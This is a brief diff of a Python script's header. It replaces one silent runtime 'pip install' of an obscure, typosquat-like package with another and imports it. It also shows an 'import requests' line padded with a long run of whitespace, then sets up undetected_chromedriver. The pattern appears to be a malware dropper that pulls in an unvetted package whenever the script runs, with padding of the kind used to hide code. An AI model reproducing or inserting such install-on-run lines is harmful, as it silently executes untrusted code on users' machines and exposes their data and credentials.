@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptographyadd")
-import syscryptographyadd
+os.system("pip install syscolouringexts")
+import syscolouringexts
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
